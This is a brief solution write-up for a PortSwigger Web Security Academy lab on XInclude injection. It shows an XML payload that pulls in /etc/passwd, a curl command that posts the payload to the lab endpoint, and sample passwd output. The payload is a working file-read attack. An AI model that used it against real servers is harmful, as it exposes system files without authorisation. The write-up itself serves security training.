\# Solution – Exploiting XInclude to Retrieve Files



\## Lab title

Exploiting XInclude to retrieve files  

(PortSwigger Web Security Academy)



\## Step 1: Find an XML endpoint that reflects user data



Example XML:

```xml

<check>

&nbsp; <message>Hello</message>

</check>





==>Server returns “Hello” – you control the value and it is reflected.



Step 2: Craft payload using XInclude



<check xmlns:xi="http://www.w3.org/2001/XInclude">

&nbsp; <message>

&nbsp;   <xi:include parse="text" href="file:///etc/passwd"/>

&nbsp; </message>

</check>





==>This wraps user data with XInclude syntax to include the file.



Step 3: Send the payload



Use Burp Repeater :



curl https://your-lab-id.web-security-academy.net/check \\

&nbsp; -X POST \\

&nbsp; -H "Content-Type: application/xml" \\

&nbsp; --data-binary @xinclude-payload.xml



Step 4: Review the response

If successful, you’ll see /etc/passwd content inside the <message> tag:



root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin



Step 5: Lab solved

The server processed XInclude and returned file data ==> lab completes.







